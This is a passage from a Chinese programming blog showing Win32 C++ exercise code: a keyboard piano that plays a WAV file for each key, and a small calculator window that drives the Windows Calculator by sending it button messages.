class="line"><span class="comment">//从本地读取歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">Data::ReadData</span><span class="params">(HWND hwnd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="comment">//如果打开成则为0</span></span><br><span class="line"><span class="type">int</span> Errno = <span class="built_in">fopen_s</span>(&amp;file, <span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Errno != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">L&quot;错误&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fgets</span>(Souce,<span class="number">50</span>,file);</span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断字符对应所播放的音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Data::If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (c_char)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Q.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_W.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_E.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_R.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_T.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Y.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_U.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_I.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_O.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_P.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_A.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_S.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_D.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_F.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_G.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_H.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_J.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_K.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_L.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Z.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_X.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_C.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_V.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_B.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_N.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_M.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：计算器"><a href="#题：计算器" class="headerlink" title="题：计算器"></a>题：计算器</h2><p>描述：自己编写一个计算器能够控制windows系统中的计算器进行操作</p><h3 id="main-cpp-主函数-1"><a href="#main-cpp-主函数-1" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;my_calc&quot;</span>;</span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line">wc.hbrBackground =(HBRUSH)COLOR_APPWORKSPACE;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;my_calc&quot;</span>,<span class="string">L&quot;计算器&quot;</span>,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,<span class="number">0</span>,<span class="number">390</span>,<span class="number">600</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,hInstance,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_NORMAL);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回调函数消息处理</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND calc = <span class="built_in">FindWindow</span>(<span class="string">L&quot;CalcFrame&quot;</span>, <span class="string">L&quot;计算器&quot;</span>);</span><br><span class="line"><span class="type">static</span> HINSTANCE hInstance = (HINSTANCE)<span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//HWND calc=FindWindow(NULL,L&quot;计算器&quot; );</span></span><br><span class="line"><span class="comment">//HWND calc = (HWND)0x00140596;</span></span><br><span class="line"><span class="keyword">switch</span> (msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//SendMessage(calc, WM_COMMAND, MAKEWPARAM(0x83, BN_CLICKED), NULL);</span></span><br><span class="line"><span class="comment">//对话框</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;edit&quot;</span>, <span class="string">L&quot; &quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER, <span class="number">10</span>, <span class="number">10</span>, <span class="number">350</span>, <span class="number">180</span>, hwnd, (HMENU)<span class="number">0x1011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//按键</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;清空&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1000</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;退格&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1017</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1001</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;2&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1002</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;3&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1003</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;4&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1004</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;5&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1005</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;6&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1006</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;7&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1007</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;8&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1008</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;9&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1009</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;0&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">440</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x0011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;.&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10012</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;+&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10013</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;-&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10014</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;*&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10015</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;/&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;等于&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">500</span>, <span class="number">350</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10018</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wparam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1011</span>:<span class="comment">//对话框</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1000</span>:<span class="comment">//清空                         //0x51是控件ID</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x51</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1017</span>:<span class="comment">//清空</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x53</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:<span class="comment">//数字1</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x83</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:<span class="comment">//数字2</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x84</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:<span class="comment">//数字3</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x85</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1004</span>:<span class="comment">//数字4</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x86</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1005</span>:<span class="comment">//数字5</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span 